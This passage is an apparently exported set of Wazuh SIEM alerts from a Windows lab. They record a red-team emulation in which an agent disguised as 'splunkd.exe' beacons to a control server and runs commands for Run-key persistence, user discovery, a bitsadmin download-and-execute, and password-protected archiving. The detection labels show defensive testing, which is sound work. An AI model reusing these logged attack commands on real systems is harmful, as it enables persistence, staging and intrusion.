ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T18:02:54.2087558Z,10178,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,9,FALSE,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052,windows_eventchannel,log,"Dec 10, 2024 @ 18:02:54.989",EventChannel,1733853774,"Dec 10, 2024 @ 18:02:54.989", , , , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-824e-6758-fe03-000000000300},6800,02:54.2,"SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.19041.4355 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , , , , , , , , , ,{15959494-7c97-6758-b201-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0xeacdd,9140,C:\\Users\\mari\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C C:\\Windows\\System32\\Curl.exe -s -A \""HttpBrowser/1.0\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""Wget/1.9+cvs-stable (Red Hat modified)\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""Opera/8.81 (Windows NT 6.0; U; en)\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""*&lt;|&gt;*\"" -m3 www.google.com &gt;nul 2&gt;&amp;1",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,TfRRspMBtNh2X6vnUuDc,1,1,192.168.117.129,agent1,4,Maryam,128,02000000C0A87502000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000,wpad,1014,0x4000000010000000,{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D},3,System,0,"""Name resolution for the name wpad timed out after none of the configured DNS servers responded.""",0,2024-12-10T18:04:11.107098200Z,3394,1628,DESKTOP-B37GATP,1014,1556,WARNING,Microsoft-Windows-DNS-Client,3,FALSE,5,Name resolution for the name wpad timed out,"[""windows"",""windows_system""]",61109,windows_eventchannel,log,"Dec 10, 2024 @ 18:04:11.894",EventChannel,1733853851,"Dec 10, 2024 @ 18:04:11.894", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,UPRRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,4624,0x8020000000000000,{54849625-5478-4994-a5ba-3e3b0328c30d},0,Security,0,"""An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		DESKTOP-QGB4EQH$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x2b4
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.""",2,2024-12-10T18:04:15.7206924Z,1056,768,DESKTOP-QGB4EQH,12544,716,AUDIT_SUCCESS,Microsoft-Windows-Security-Auditing,6,FALSE,3,Windows logon success.,"[""windows"",""windows_security"",""authentication_success""]",60106,windows_eventchannel,log,"Dec 10, 2024 @ 18:04:16.539",EventChannel,1733853856,"Dec 10, 2024 @ 18:04:16.539", , , ,"[""IV_32.2""]","[""7.1"",""7.2""]", , , , , , , , , ,0x2b4, , , , , , ,"[""Valid Accounts""]","[""T1078""]","[""Defense Evasion"",""Persistence"",""Privilege Escalation"",""Initial Access""]", , , , , , ,"[""10.2.5""]","[""164.312.b""]","[""CC6.8"",""CC7.2"",""CC7.3""]","[""AC.7"",""AU.14""]", , ,{00000000-0000-0000-0000-000000000000}, , , , , , , , , ,0x3e7,WORKGROUP,0x0,%%1833,Negotiate,0x3e7,Advapi,SYSTEM,0,%%1842,S-1-5-18,C:\\Windows\\System32\\services.exe,NT AUTHORITY,S-1-5-18,%%1843,5,DESKTOP-QGB4EQH$, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,VvRRspMBtNh2X6vnUuDc,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,10,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process accessed:
RuleName: technique_id=T1036,technique_name=Masquerading
UtcTime: 2024-12-10 18:04:24.926
SourceProcessGUID: {15959494-7b92-6758-9300-000000000300}
SourceProcessId: 5548
SourceThreadId: 7804
SourceImage: C:\Users\mari\AppData\Local\Microsoft\OneDrive\OneDrive.exe
TargetProcessGUID: {15959494-7b78-6758-6900-000000000300}
TargetProcessId: 600
TargetImage: C:\WINDOWS\Explorer.EXE
GrantedAccess: 0x101411
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+9d9b4|C:\WINDOWS\System32\KERNELBASE.dll+338ae|C:\Users\mari\AppData\Local\Microsoft\OneDrive\24.221.1103.0003\FileSyncClient.dll+5eb841|C:\Users\mari\AppData\Local\Microsoft\OneDrive\24.221.1103.0003\FileSyncClient.dll+8a156|C:\Users\mari\AppData\Local\Microsoft\OneDrive\24.221.1103.0003\FileSyncClient.dll+89ed7|C:\Users\mari\AppData\Local\Microsoft\OneDrive\24.221.1103.0003\FileSyncClient.dll+89dc6|C:\Users\mari\AppData\Local\Microsoft\OneDrive\24.221.1103.0003\FileSyncEvents.dll+edb1|C:\Users\mari\AppData\Local\Microsoft\OneDrive\24.221.1103.0003\FileSyncHost.DLL+ce95|C:\Users\mari\AppData\Local\Microsoft\OneDrive\24.221.1103.0003\FileSyncHost.DLL+f665|C:\WINDOWS\System32\ucrtbase.dll+21bb2|C:\WINDOWS\System32\KERNEL32.DLL+17374|C:\WINDOWS\SYSTEM32\ntdll.dll+4cc91
SourceUser: DESKTOP-QGB4EQH\mari
TargetUser: DESKTOP-QGB4EQH\mari""",3,2024-12-10T18:04:24.9286285Z,10389,3880,DESKTOP-QGB4EQH,10,2624,INFORMATION,Microsoft-Windows-Sysmon,1,TRUE,12,"Explorer process was accessed by C:\\Users\\mari\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe, possible process injection","[""sysmon"",""sysmon_eid10_detections"",""windows""]",92910,windows_eventchannel,log,"Dec 10, 2024 @ 18:04:24.708",EventChannel,1733853864,"Dec 10, 2024 @ 18:04:24.708", , , , , , , , , , , , , , , ,04:24.9, ,"technique_id=T1036,technique_name=Masquerading", , , ,"[""Process Injection""]","[""T1055""]","[""Defense Evasion"",""Privilege Escalation""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,0x101411,600,DESKTOP-QGB4EQH\\mari,C:\\WINDOWS\\Explorer.EXE,{15959494-7b92-6758-9300-000000000300},C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9d9b4|C:\\WINDOWS\\System32\\KERNELBASE.dll+338ae|C:\\Users\\mari\\AppData\\Local\\Microsoft\\OneDrive\\24.221.1103.0003\\FileSyncClient.dll+5eb841|C:\\Users\\mari\\AppData\\Local\\Microsoft\\OneDrive\\24.221.1103.0003\\FileSyncClient.dll+8a156|C:\\Users\\mari\\AppData\\Local\\Microsoft\\OneDrive\\24.221.1103.0003\\FileSyncClient.dll+89ed7|C:\\Users\\mari\\AppData\\Local\\Microsoft\\OneDrive\\24.221.1103.0003\\FileSyncClient.dll+89dc6|C:\\Users\\mari\\AppData\\Local\\Microsoft\\OneDrive\\24.221.1103.0003\\FileSyncEvents.dll+edb1|C:\\Users\\mari\\AppData\\Local\\Microsoft\\OneDrive\\24.221.1103.0003\\FileSyncHost.DLL+ce95|C:\\Users\\mari\\AppData\\Local\\Microsoft\\OneDrive\\24.221.1103.0003\\FileSyncHost.DLL+f665|C:\\WINDOWS\\System32\\ucrtbase.dll+21bb2|C:\\WINDOWS\\System32\\KERNEL32.DLL+17374|C:\\WINDOWS\\SYSTEM32\\ntdll.dll+4cc91,7804,{15959494-7b78-6758-6900-000000000300},5548,C:\\Users\\mari\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,XfRRspMBtNh2X6vnU-Aq,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-12-10 18:05:58.217
ProcessGuid: {15959494-8306-6758-4c04-000000000300}
ProcessId: 7072
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\Path\AtomicRedTeam.exe""
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {15959494-7c97-6758-b201-000000000300}
ParentProcessId: 9140
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T18:05:58.2192097Z,10461,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,12,FALSE,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052,windows_eventchannel,log,"Dec 10, 2024 @ 18:05:58.990",EventChannel,1733853958,"Dec 10, 2024 @ 18:05:58.990", , , , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-8306-6758-4c04-000000000300},7072,05:58.2,"SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.19041.4355 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , , , , , , , , , ,{15959494-7c97-6758-b201-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0xeacdd,9140,C:\\Users\\mari\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C REG ADD \""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"" /V \""Atomic Red Team\"" /t REG_SZ /F /D \""C:\\Path\\AtomicRedTeam.exe\""",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,XvRRspMBtNh2X6vnU-Aq,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1012,technique_name=Query Registry
UtcTime: 2024-12-10 18:05:58.323
ProcessGuid: {15959494-8306-6758-4d04-000000000300}
ProcessId: 2380
Image: C:\Windows\System32\reg.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Registry Console Tool
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: reg.exe
CommandLine: REG  ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\Path\AtomicRedTeam.exe""
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=C0DB341DEFA8EF40C03ED769A9001D600E0F4DAE,MD5=227F63E1D9008B36BDBCC4B397780BE4,SHA256=C0E25B1F9B22DE445298C1E96DDFCEAD265CA030FA6626F61A4A4786CC4A3B7D,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: {15959494-8306-6758-4c04-000000000300}
ParentProcessId: 7072
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\Path\AtomicRedTeam.exe""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T18:05:58.3245914Z,10463,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,2,FALSE,10,Value added to registry key has Base64-like pattern,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92041,windows_eventchannel,log,"Dec 10, 2024 @ 18:05:59.006",EventChannel,1733853959,"Dec 10, 2024 @ 18:05:59.006", , , , , ,reg.exe,C:\\Windows\\System32\\reg.exe,Microsoft® Windows® Operating System, , ,Registry Console Tool, , ,{15959494-8306-6758-4d04-000000000300},2380,05:58.3,"SHA1=C0DB341DEFA8EF40C03ED769A9001D600E0F4DAE,MD5=227F63E1D9008B36BDBCC4B397780BE4,SHA256=C0E25B1F9B22DE445298C1E96DDFCEAD265CA030FA6626F61A4A4786CC4A3B7D,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC","technique_id=T1012,technique_name=Query Registry",Microsoft Corporation,10.0.19041.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Obfuscated Files or Information"",""Modify Registry""]","[""T1027"",""T1112""]","[""Defense Evasion""]", , , , , , , , , , , ,{15959494-8306-6758-4c04-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"cmd.exe /C REG ADD \""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"" /V \""Atomic Red Team\"" /t REG_SZ /F /D \""C:\\Path\\AtomicRedTeam.exe\""",0xeacdd,7072,C:\\Users\\mari\\,C:\\Windows\\System32\\cmd.exe,"REG  ADD \""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"" /V \""Atomic Red Team\"" /t REG_SZ /F /D \""C:\\Path\\AtomicRedTeam.exe\""",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,YPRRspMBtNh2X6vnU-Aq,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1057,technique_name=Process Discovery
UtcTime: 2024-12-10 18:06:02.242
ProcessGuid: {15959494-830a-6758-4f04-000000000300}
ProcessId: 9800
Image: C:\Windows\System32\query.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: MultiUser Query Utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: query.exe
CommandLine: query  user
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=BFF9633D301818EB5DEB684E758A04BC204FECC9,MD5=29043BC0B0F99EAFF36CAD35CBEE8D45,SHA256=58D1132B636C6D33C2B8B3659F310F6DE370A00F837226129657B2B82184A307,IMPHASH=CCC9DA4A55E90DFE34CBCDB066D6A6B3
ParentProcessGuid: {15959494-830a-6758-4e04-000000000300}
ParentProcessId: 5244
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C query user
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T18:06:02.2432543Z,10468,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,13,FALSE,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032,windows_eventchannel,log,"Dec 10, 2024 @ 18:06:03.027",EventChannel,1733853963,"Dec 10, 2024 @ 18:06:03.027", , , , , ,query.exe,C:\\Windows\\System32\\query.exe,Microsoft® Windows® Operating System, , ,MultiUser Query Utility, , ,{15959494-830a-6758-4f04-000000000300},9800,06:02.2,"SHA1=BFF9633D301818EB5DEB684E758A04BC204FECC9,MD5=29043BC0B0F99EAFF36CAD35CBEE8D45,SHA256=58D1132B636C6D33C2B8B3659F310F6DE370A00F837226129657B2B82184A307,IMPHASH=CCC9DA4A55E90DFE34CBCDB066D6A6B3","technique_id=T1057,technique_name=Process Discovery",Microsoft Corporation,10.0.19041.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , , , , , , , , , ,{15959494-830a-6758-4e04-000000000300},{15959494-7b75-6758-ddac-0e0000000000},cmd.exe /C query user,0xeacdd,5244,C:\\Users\\mari\\,C:\\Windows\\System32\\cmd.exe,query  user,Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,ZfRRspMBtNh2X6vnU-Aq,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-12-10 18:07:37.307
ProcessGuid: {15959494-8369-6758-7004-000000000300}
ProcessId: 3280
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C if not exist ""%%ProgramFiles%%\7-zip\7z.exe""  ( call ) ELSE ( echo Downloading 7-zip installer && bitsadmin /transfer myDownloadJob /download /priority normal ""https://www.7-zip.org/a/7z2301-x64.exe"" %%TEMP%%\7zip.exe && %%TEMP%%\7zip.exe /S ) &&   &&  mkdir $PathToAtomicsFolder\T1560.001\victim-files && cd $PathToAtomicsFolder\T1560.001\victim-files && echo ""This file will be encrypted"" > .\encrypted_file.txt && ""%%ProgramFiles%%\7-zip\7z.exe"" u archive.7z *txt -pblue && dir
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {15959494-7c97-6758-b201-000000000300}
ParentProcessId: 9140
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T18:07:37.3204362Z,10560,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,15,FALSE,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052,windows_eventchannel,log,"Dec 10, 2024 @ 18:07:37.867",EventChannel,1733854057,"Dec 10, 2024 @ 18:07:37.867", , , , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-8369-6758-7004-000000000300},3280,07:37.3,"SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.19041.4355 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , , , , , , , , , ,{15959494-7c97-6758-b201-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0xeacdd,9140,C:\\Users\\mari\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C if not exist \""%%ProgramFiles%%\\7-zip\\7z.exe\""  ( call ) ELSE ( echo Downloading 7-zip installer &amp;&amp; bitsadmin /transfer myDownloadJob /download /priority normal \""https://www.7-zip.org/a/7z2301-x64.exe\"" %%TEMP%%\\7zip.exe &amp;&amp; %%TEMP%%\\7zip.exe /S ) &amp;&amp;   &amp;&amp;  mkdir $PathToAtomicsFolder\\T1560.001\\victim-files &amp;&amp; cd $PathToAtomicsFolder\\T1560.001\\victim-files &amp;&amp; echo \""This file will be encrypted\"" &gt; .\\encrypted_file.txt &amp;&amp; \""%%ProgramFiles%%\\7-zip\\7z.exe\"" u archive.7z *txt -pblue &amp;&amp; dir",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
